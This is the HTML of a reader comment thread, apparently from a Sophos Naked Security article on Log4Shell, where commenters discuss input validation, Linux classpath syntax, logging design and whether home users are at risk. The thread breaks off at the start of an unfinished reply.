						<a href="https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/#comment-6370088"><time datetime="2021-12-13T14:36:57+00:00">December 13, 2021 at 2:36 pm</time></a>					</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>Excellent write-up.</p>
<p>Perfect answer to the age-old developer question, &#8220;So, do we need to do input validation, and if so, why?&#8221; 🙂</p>
<div class="cs-rating pd-rating" id="pd_rating_holder_7238218_comm_6370088"></div>
<script type="text/javascript" charset="UTF-8"><!--//--><![CDATA[//><!--
PDRTJS_settings_7238218_comm_6370088={"id":7238218,"unique_id":"wp-comment-6370088","title":"Excellent%20write-up.Perfect%20answer%20to%20the%20age-old%20developer%20question%2C%20%26quot%3BSo%2C%20do%20we%20need%20to%20do%20input%20validation%2C%20and%20if%20so%2C%20why%3F%26quot%3B%20%3A%29%E2%80%A6","permalink":"https:\/\/nakedsecurity.sophos.com\/2021\/12\/13\/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it\/#comment-6370088","item_id":"_comm_6370088"};
//--><!]]></script>
<script type="text/javascript" charset="UTF-8" src="https://polldaddy.com/js/rating/rating.js"></script>				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/?replytocom=6370088#respond' data-commentid="6370088" data-postid="647469" data-belowelement="div-comment-6370088" data-respondelement="respond" data-replyto="Reply to Bill Long" aria-label='Reply to Bill Long'>Reply</a></div>			</article><!-- .comment-body -->
		</li><!-- #comment-## -->
		<li id="comment-6370135" class="comment odd alt thread-even depth-1 parent">
			<article id="div-comment-6370135" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/?s=50&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/?s=100&#038;d=mm&#038;r=g 2x' class='avatar avatar-50 photo avatar-default' height='50' width='50' loading='lazy'/>						<b class="fn">Anonymous</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/#comment-6370135"><time datetime="2021-12-13T18:19:42+00:00">December 13, 2021 at 6:19 pm</time></a>					</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>Linux (colon, not semi-colon):<br />
export CLASSPATH=&#8221;log4j-core-2.14.1.jar:log4j-api-2.14.1.jar&#8221;</p>
<div class="cs-rating pd-rating" id="pd_rating_holder_7238218_comm_6370135"></div>
<script type="text/javascript" charset="UTF-8"><!--//--><![CDATA[//><!--
PDRTJS_settings_7238218_comm_6370135={"id":7238218,"unique_id":"wp-comment-6370135","title":"Linux%20%28colon%2C%20not%20semi-colon%29%3Aexport%20CLASSPATH%3D%26quot%3Blog4j-core-2.14.1.jar%3Alog4j-api-2.14.1.jar%26quot%3B%E2%80%A6","permalink":"https:\/\/nakedsecurity.sophos.com\/2021\/12\/13\/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it\/#comment-6370135","item_id":"_comm_6370135"};
//--><!]]></script>
<script type="text/javascript" charset="UTF-8" src="https://polldaddy.com/js/rating/rating.js"></script>				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/?replytocom=6370135#respond' data-commentid="6370135" data-postid="647469" data-belowelement="div-comment-6370135" data-respondelement="respond" data-replyto="Reply to " aria-label='Reply to '>Reply</a></div>			</article><!-- .comment-body -->
		<ul class="children">
		<li id="comment-6370147" class="comment byuser comment-author-pducklin bypostauthor even depth-2">
			<article id="div-comment-6370147" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/025c4bb891cbc5a1bb24a4854f823e48?s=50&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/025c4bb891cbc5a1bb24a4854f823e48?s=100&#038;d=mm&#038;r=g 2x' class='avatar avatar-50 photo' height='50' width='50' loading='lazy'/>						<b class="fn">Paul Ducklin</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/#comment-6370147"><time datetime="2021-12-13T18:53:13+00:00">December 13, 2021 at 6:53 pm</time></a>					</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>It does say that in the article, albeit indirectly :&#045;) (&#8220;<em>Put a colon between the filenames on Linux or Mac, and change &#8216;set&#8217; to &#8216;export&#8217;.</em>&#8220;)</p>
<div class="cs-rating pd-rating" id="pd_rating_holder_7238218_comm_6370147"></div>
<script type="text/javascript" charset="UTF-8"><!--//--><![CDATA[//><!--
PDRTJS_settings_7238218_comm_6370147={"id":7238218,"unique_id":"wp-comment-6370147","title":"It%20does%20say%20that%20in%20the%20article%2C%20albeit%20indirectly%20%3A%26%23045%3B%29%20%28%26quot%3B%26lt%3Bem%26gt%3BPut%20a%20colon%20between%20the%20filenames%20on%20Linux%20or%20Mac%2C%20and%20change%20%26%23039%3Bset%26%23039%3B%20to%20%26%23039%3Bexport%26%23039%3B.%26lt%3B%2Fem%26gt%3B%26quot%3B%29%E2%80%A6","permalink":"https:\/\/nakedsecurity.sophos.com\/2021\/12\/13\/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it\/#comment-6370147","item_id":"_comm_6370147"};
//--><!]]></script>
<script type="text/javascript" charset="UTF-8" src="https://polldaddy.com/js/rating/rating.js"></script>				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/?replytocom=6370147#respond' data-commentid="6370147" data-postid="647469" data-belowelement="div-comment-6370147" data-respondelement="respond" data-replyto="Reply to Paul Ducklin" aria-label='Reply to Paul Ducklin'>Reply</a></div>			</article><!-- .comment-body -->
		</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
		<li id="comment-6370137" class="comment odd alt thread-odd thread-alt depth-1">
			<article id="div-comment-6370137" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/4dcc0faee302d28daa211c98159ace9a?s=50&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/4dcc0faee302d28daa211c98159ace9a?s=100&#038;d=mm&#038;r=g 2x' class='avatar avatar-50 photo' height='50' width='50' loading='lazy'/>						<b class="fn">Bryan</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/#comment-6370137"><time datetime="2021-12-13T18:30:10+00:00">December 13, 2021 at 6:30 pm</time></a>					</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>&#8230;or this article could possibly at least prompt awareness that there should be a question&#8211;or rather it should be no question.<br />
At a former sysadmin job of mine we had a crew of developers whose dominant mantra was clearly &#8220;<i>move fast and break things</i>,&#8221; though it would be years before I actually would hear the saying.<br />
They frequently brought forth issues of the look-before-you-leap variety.</p>
<div class="cs-rating pd-rating" id="pd_rating_holder_7238218_comm_6370137"></div>
<script type="text/javascript" charset="UTF-8"><!--//--><![CDATA[//><!--
PDRTJS_settings_7238218_comm_6370137={"id":7238218,"unique_id":"wp-comment-6370137","title":"...or%20this%20article%20could%20possibly%20at%20least%20prompt%20awareness%20that%20there%20should%20be%20a%20question--or%20rather%20it%20should%20be%20no%20question.At%20a%20former%20sysadmin%20job%20of%20mine%20we%20had%20a%20crew%20of%20developers%20whose%20%E2%80%A6","permalink":"https:\/\/nakedsecurity.sophos.com\/2021\/12\/13\/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it\/#comment-6370137","item_id":"_comm_6370137"};
//--><!]]></script>
<script type="text/javascript" charset="UTF-8" src="https://polldaddy.com/js/rating/rating.js"></script>				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/?replytocom=6370137#respond' data-commentid="6370137" data-postid="647469" data-belowelement="div-comment-6370137" data-respondelement="respond" data-replyto="Reply to Bryan" aria-label='Reply to Bryan'>Reply</a></div>			</article><!-- .comment-body -->
		</li><!-- #comment-## -->
		<li id="comment-6370142" class="comment even thread-even depth-1 parent">
			<article id="div-comment-6370142" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/d7f3e664776951a06d0ca9504f028b19?s=50&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/d7f3e664776951a06d0ca9504f028b19?s=100&#038;d=mm&#038;r=g 2x' class='avatar avatar-50 photo' height='50' width='50' loading='lazy'/>						<b class="fn">Rick Byington</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/#comment-6370142"><time datetime="2021-12-13T18:44:08+00:00">December 13, 2021 at 6:44 pm</time></a>					</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>Want to share another POV on logging libraries and why this is a good example why the industry is moving from monolithic code bases to more specific micro-services. Having your application also be &#8216;concerned&#8217; about formatting logging is having your application do too much. Log handling is a separate concern and shouldn&#8217;t be handled in your app. If you start to follow a 12 factor app philosophy you would start logging to plain old system out and let your system/container handle how to get logging where it should go and filtered as needed.  I know this might sound odd if you are a Java dev (it did for me at first too) but the more you reduce the number of dependencies (libs) and concerns of what your app needs todo, the more secure your app will become. Of course, you can&#8217;t just do this with legacy apps over night, but something to consider as you build new apps or are making maintenance updates in the future.</p>
<div class="cs-rating pd-rating" id="pd_rating_holder_7238218_comm_6370142"></div>
<script type="text/javascript" charset="UTF-8"><!--//--><![CDATA[//><!--
PDRTJS_settings_7238218_comm_6370142={"id":7238218,"unique_id":"wp-comment-6370142","title":"Want%20to%20share%20another%20POV%20on%20logging%20libraries%20and%20why%20this%20is%20a%20good%20example%20why%20the%20industry%20is%20moving%20from%20monolithic%20code%20bases%20to%20more%20specific%20micro-services.%20Having%20your%20application%20also%20b%E2%80%A6","permalink":"https:\/\/nakedsecurity.sophos.com\/2021\/12\/13\/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it\/#comment-6370142","item_id":"_comm_6370142"};
//--><!]]></script>
<script type="text/javascript" charset="UTF-8" src="https://polldaddy.com/js/rating/rating.js"></script>				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/?replytocom=6370142#respond' data-commentid="6370142" data-postid="647469" data-belowelement="div-comment-6370142" data-respondelement="respond" data-replyto="Reply to Rick Byington" aria-label='Reply to Rick Byington'>Reply</a></div>			</article><!-- .comment-body -->
		<ul class="children">
		<li id="comment-6370158" class="comment byuser comment-author-pducklin bypostauthor odd alt depth-2">
			<article id="div-comment-6370158" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/025c4bb891cbc5a1bb24a4854f823e48?s=50&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/025c4bb891cbc5a1bb24a4854f823e48?s=100&#038;d=mm&#038;r=g 2x' class='avatar avatar-50 photo' height='50' width='50' loading='lazy'/>						<b class="fn">Paul Ducklin</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/#comment-6370158"><time datetime="2021-12-13T19:36:43+00:00">December 13, 2021 at 7:36 pm</time></a>					</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>I think the problem here is that Log4j is so abstracted that when you write what looks like simple code that is intended to &#8216;make this exact data appear in the log&#8217;, you may in fact be sending what is effectively bytecode for a &#8216;logging VM&#8217; to interpret.</p>
<p>(My own logging library, admittedly for Lua, not for Java, automatically logs exactly what you tell it to if you send one parameter, or does formatting at the other end if you send more than one, sort of like puts() and printf() combined. So if there is exactly one argument to the logging function you will get uninterpolated/unextrapolated/non-cooked data recording.)</p>
<div class="cs-rating pd-rating" id="pd_rating_holder_7238218_comm_6370158"></div>
<script type="text/javascript" charset="UTF-8"><!--//--><![CDATA[//><!--
PDRTJS_settings_7238218_comm_6370158={"id":7238218,"unique_id":"wp-comment-6370158","title":"I%20think%20the%20problem%20here%20is%20that%20Log4j%20is%20so%20abstracted%20that%20when%20you%20write%20what%20looks%20like%20simple%20code%20that%20is%20intended%20to%20%26%23039%3Bmake%20this%20exact%20data%20appear%20in%20the%20log%26%23039%3B%2C%20you%20may%20in%20fact%20be%20sending%20wh%E2%80%A6","permalink":"https:\/\/nakedsecurity.sophos.com\/2021\/12\/13\/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it\/#comment-6370158","item_id":"_comm_6370158"};
//--><!]]></script>
<script type="text/javascript" charset="UTF-8" src="https://polldaddy.com/js/rating/rating.js"></script>				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/?replytocom=6370158#respond' data-commentid="6370158" data-postid="647469" data-belowelement="div-comment-6370158" data-respondelement="respond" data-replyto="Reply to Paul Ducklin" aria-label='Reply to Paul Ducklin'>Reply</a></div>			</article><!-- .comment-body -->
		</li><!-- #comment-## -->
		<li id="comment-6370502" class="comment even depth-2">
			<article id="div-comment-6370502" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/?s=50&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/?s=100&#038;d=mm&#038;r=g 2x' class='avatar avatar-50 photo avatar-default' height='50' width='50' loading='lazy'/>						<b class="fn">Anonymous</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/#comment-6370502"><time datetime="2021-12-14T20:18:14+00:00">December 14, 2021 at 8:18 pm</time></a>					</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>Sure, but your deployment environment  becomes very complex and hard to troubleshoot.</p>
<div class="cs-rating pd-rating" id="pd_rating_holder_7238218_comm_6370502"></div>
<script type="text/javascript" charset="UTF-8"><!--//--><![CDATA[//><!--
PDRTJS_settings_7238218_comm_6370502={"id":7238218,"unique_id":"wp-comment-6370502","title":"Sure%2C%20but%20your%20deployment%20environment%20%20becomes%20very%20complex%20and%20hard%20to%20troubleshoot.%E2%80%A6","permalink":"https:\/\/nakedsecurity.sophos.com\/2021\/12\/13\/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it\/#comment-6370502","item_id":"_comm_6370502"};
//--><!]]></script>
<script type="text/javascript" charset="UTF-8" src="https://polldaddy.com/js/rating/rating.js"></script>				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/?replytocom=6370502#respond' data-commentid="6370502" data-postid="647469" data-belowelement="div-comment-6370502" data-respondelement="respond" data-replyto="Reply to " aria-label='Reply to '>Reply</a></div>			</article><!-- .comment-body -->
		</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
		<li id="comment-6370143" class="comment odd alt thread-odd thread-alt depth-1 parent">
			<article id="div-comment-6370143" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/ce627a76fa78e4db41326b8d1454923e?s=50&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/ce627a76fa78e4db41326b8d1454923e?s=100&#038;d=mm&#038;r=g 2x' class='avatar avatar-50 photo' height='50' width='50' loading='lazy'/>						<b class="fn">Richard</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/#comment-6370143"><time datetime="2021-12-13T18:44:30+00:00">December 13, 2021 at 6:44 pm</time></a>					</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>&#8220;But in a real-world attack, cybercriminals who knows&#8221; should read &#8220;But in a real-world attack, a cybercriminal who knows&#8221;.</p>
<p>In the old days, we used to call it &#8220;sanity checking the input&#8221;.  It includes such things as checking the input length (How long is that buffer you&#8217;re reading into?), error handling (Did your yes/no question allow for an inappropriate answer? Was that string of garbage actually the key entry point for a trapdoor?).  There are many variations on the theme.</p>
<div class="cs-rating pd-rating" id="pd_rating_holder_7238218_comm_6370143"></div>
<script type="text/javascript" charset="UTF-8"><!--//--><![CDATA[//><!--
PDRTJS_settings_7238218_comm_6370143={"id":7238218,"unique_id":"wp-comment-6370143","title":"%26quot%3BBut%20in%20a%20real-world%20attack%2C%20cybercriminals%20who%20knows%26quot%3B%20should%20read%20%26quot%3BBut%20in%20a%20real-world%20attack%2C%20a%20cybercriminal%20who%20knows%26quot%3B.In%20the%20old%20days%2C%20we%20used%20to%20call%20it%20%26quot%3Bsanity%20checking%20the%20input%26quot%3B.%20%20It%20inc%E2%80%A6","permalink":"https:\/\/nakedsecurity.sophos.com\/2021\/12\/13\/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it\/#comment-6370143","item_id":"_comm_6370143"};
//--><!]]></script>
<script type="text/javascript" charset="UTF-8" src="https://polldaddy.com/js/rating/rating.js"></script>				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/?replytocom=6370143#respond' data-commentid="6370143" data-postid="647469" data-belowelement="div-comment-6370143" data-respondelement="respond" data-replyto="Reply to Richard" aria-label='Reply to Richard'>Reply</a></div>			</article><!-- .comment-body -->
		<ul class="children">
		<li id="comment-6370160" class="comment byuser comment-author-pducklin bypostauthor even depth-2">
			<article id="div-comment-6370160" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/025c4bb891cbc5a1bb24a4854f823e48?s=50&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/025c4bb891cbc5a1bb24a4854f823e48?s=100&#038;d=mm&#038;r=g 2x' class='avatar avatar-50 photo' height='50' width='50' loading='lazy'/>						<b class="fn">Paul Ducklin</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/#comment-6370160"><time datetime="2021-12-13T19:46:04+00:00">December 13, 2021 at 7:46 pm</time></a>					</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>Obligatory old joke:</p>
<p>A code reviewer walks into a bar and says, &#8220;0.20000000000E1 beers, please.&#8221;</p>
<p>And the barman says, &#8220;I&#8217;m sorry, we don&#8217;t serve your type.&#8221;</p>
<p>PS. Fixed the grammo. <em>&#8220;Cybercriminals who know&#8230;&#8221;</em>, thanks.</p>
<div class="cs-rating pd-rating" id="pd_rating_holder_7238218_comm_6370160"></div>
<script type="text/javascript" charset="UTF-8"><!--//--><![CDATA[//><!--
PDRTJS_settings_7238218_comm_6370160={"id":7238218,"unique_id":"wp-comment-6370160","title":"Obligatory%20old%20joke%3AA%20code%20reviewer%20walks%20into%20a%20bar%20and%20says%2C%20%26quot%3B0.20000000000E1%20beers%2C%20please.%26quot%3BAnd%20the%20barman%20says%2C%20%26quot%3BI%26%23039%3Bm%20sorry%2C%20we%20don%26%23039%3Bt%20serve%20your%20type.%26quot%3BPS.%20Fixed%20the%20grammo.%20%26lt%3Bem%26gt%3B%26quot%3BCybercriminals%E2%80%A6","permalink":"https:\/\/nakedsecurity.sophos.com\/2021\/12\/13\/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it\/#comment-6370160","item_id":"_comm_6370160"};
//--><!]]></script>
<script type="text/javascript" charset="UTF-8" src="https://polldaddy.com/js/rating/rating.js"></script>				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/?replytocom=6370160#respond' data-commentid="6370160" data-postid="647469" data-belowelement="div-comment-6370160" data-respondelement="respond" data-replyto="Reply to Paul Ducklin" aria-label='Reply to Paul Ducklin'>Reply</a></div>			</article><!-- .comment-body -->
		</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
		<li id="comment-6370151" class="comment odd alt thread-even depth-1 parent">
			<article id="div-comment-6370151" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/5e925bfd10cfd6d5b8606a73cef120cb?s=50&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/5e925bfd10cfd6d5b8606a73cef120cb?s=100&#038;d=mm&#038;r=g 2x' class='avatar avatar-50 photo' height='50' width='50' loading='lazy'/>						<b class="fn">EM</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/#comment-6370151"><time datetime="2021-12-13T19:02:35+00:00">December 13, 2021 at 7:02 pm</time></a>					</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>Is this an issue for system admins, etc., and not everyday user (pc / Mac)?</p>
<div class="cs-rating pd-rating" id="pd_rating_holder_7238218_comm_6370151"></div>
<script type="text/javascript" charset="UTF-8"><!--//--><![CDATA[//><!--
PDRTJS_settings_7238218_comm_6370151={"id":7238218,"unique_id":"wp-comment-6370151","title":"Is%20this%20an%20issue%20for%20system%20admins%2C%20etc.%2C%20and%20not%20everyday%20user%20%28pc%20%2F%20Mac%29%3F%E2%80%A6","permalink":"https:\/\/nakedsecurity.sophos.com\/2021\/12\/13\/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it\/#comment-6370151","item_id":"_comm_6370151"};
//--><!]]></script>
<script type="text/javascript" charset="UTF-8" src="https://polldaddy.com/js/rating/rating.js"></script>				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/?replytocom=6370151#respond' data-commentid="6370151" data-postid="647469" data-belowelement="div-comment-6370151" data-respondelement="respond" data-replyto="Reply to EM" aria-label='Reply to EM'>Reply</a></div>			</article><!-- .comment-body -->
		<ul class="children">
		<li id="comment-6370348" class="comment byuser comment-author-pducklin bypostauthor even depth-2">
			<article id="div-comment-6370348" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/025c4bb891cbc5a1bb24a4854f823e48?s=50&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/025c4bb891cbc5a1bb24a4854f823e48?s=100&#038;d=mm&#038;r=g 2x' class='avatar avatar-50 photo' height='50' width='50' loading='lazy'/>						<b class="fn">Paul Ducklin</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/#comment-6370348"><time datetime="2021-12-14T08:31:27+00:00">December 14, 2021 at 8:31 am</time></a>					</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>In theory, yes, for example if you had a Java program that scanned files for keyboards and someone could trick you into searching for a “trigger string” (and that trigger string got logged). In practice, this is unlikely. The main issue I can see for home users is whether any cloud services they use, e.g. for blogging, are affected&#8230; contact your service providers for advice!</p>
<div class="cs-rating pd-rating" id="pd_rating_holder_7238218_comm_6370348"></div>
<script type="text/javascript" charset="UTF-8"><!--//--><![CDATA[//><!--
PDRTJS_settings_7238218_comm_6370348={"id":7238218,"unique_id":"wp-comment-6370348","title":"In%20theory%2C%20yes%2C%20for%20example%20if%20you%20had%20a%20Java%20program%20that%20scanned%20files%20for%20keyboards%20and%20someone%20could%20trick%20you%20into%20searching%20for%20a%20trigger%20string%20%28and%20that%20trigger%20string%20got%20logged%29.%20In%20pra%E2%80%A6","permalink":"https:\/\/nakedsecurity.sophos.com\/2021\/12\/13\/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it\/#comment-6370348","item_id":"_comm_6370348"};
//--><!]]></script>
<script type="text/javascript" charset="UTF-8" src="https://polldaddy.com/js/rating/rating.js"></script>				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/?replytocom=6370348#respond' data-commentid="6370348" data-postid="647469" data-belowelement="div-comment-6370348" data-respondelement="respond" data-replyto="Reply to Paul Ducklin" aria-label='Reply to Paul Ducklin'>Reply</a></div>			</article><!-- .comment-body -->
		</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
		<li id="comment-6370155" class="comment odd alt thread-odd thread-alt depth-1 parent">
			<article id="div-comment-6370155" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/9e7ffe0cb0d6b493fea758150232a0d2?s=50&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/9e7ffe0cb0d6b493fea758150232a0d2?s=100&#038;d=mm&#038;r=g 2x' class='avatar avatar-50 photo' height='50' width='50' loading='lazy'/>						<b class="fn">James Monroe</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/#comment-6370155"><time datetime="2021-12-13T19:24:56+00:00">December 13, 2021 at 7:24 pm</time></a>					</div><!-- .comment-metadata -->

									</footer><!-- .comment-meta -->

				<div class="comment-content">
					<p>HI there, I am hearing that this only affects HTTP connectons. If all our external internet-facing are HTTPS. then why would this be a concern? I have noriced that Emotet is now dropping Cobalt Strike. In an attack scenario, if CS is already in the environment, might the attacker simply use CS crafted packets with their own code to attack vulnerable internal systems.? Or can someone help me explain this differently please. Thanks in advance.</p>
<div class="cs-rating pd-rating" id="pd_rating_holder_7238218_comm_6370155"></div>
<script type="text/javascript" charset="UTF-8"><!--//--><![CDATA[//><!--
PDRTJS_settings_7238218_comm_6370155={"id":7238218,"unique_id":"wp-comment-6370155","title":"HI%20there%2C%20I%20am%20hearing%20that%20this%20only%20affects%20HTTP%20connectons.%20If%20all%20our%20external%20internet-facing%20are%20HTTPS.%20then%20why%20would%20this%20be%20a%20concern%3F%20I%20have%20noriced%20that%20Emotet%20is%20now%20dropping%20Cobalt%20S%E2%80%A6","permalink":"https:\/\/nakedsecurity.sophos.com\/2021\/12\/13\/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it\/#comment-6370155","item_id":"_comm_6370155"};
//--><!]]></script>
<script type="text/javascript" charset="UTF-8" src="https://polldaddy.com/js/rating/rating.js"></script>				</div><!-- .comment-content -->

				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/?replytocom=6370155#respond' data-commentid="6370155" data-postid="647469" data-belowelement="div-comment-6370155" data-respondelement="respond" data-replyto="Reply to James Monroe" aria-label='Reply to James Monroe'>Reply</a></div>			</article><!-- .comment-body -->
		<ul class="children">
		<li id="comment-6370346" class="comment byuser comment-author-pducklin bypostauthor even depth-2">
			<article id="div-comment-6370346" class="comment-body">
				<footer class="comment-meta">
					<div class="comment-author vcard">
						<img alt='' src='https://secure.gravatar.com/avatar/025c4bb891cbc5a1bb24a4854f823e48?s=50&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/025c4bb891cbc5a1bb24a4854f823e48?s=100&#038;d=mm&#038;r=g 2x' class='avatar avatar-50 photo' height='50' width='50' loading='lazy'/>						<b class="fn">Paul Ducklin</b> <span class="says">says:</span>					</div><!-- .comment-author -->

					<div class="comment-metadata">
						<a href="https://nakedsecurity.sophos.com/2021/12/13/log4shell-explained-how-it-works-why-you-need-to-know-and-how-to-fix-it/#comment-6370346"><time datetime="2021-12-14T08:26:16+00:00">December 14, 2021 at 8:26 am</time></a>					</div><!-- .comment-metadata -->

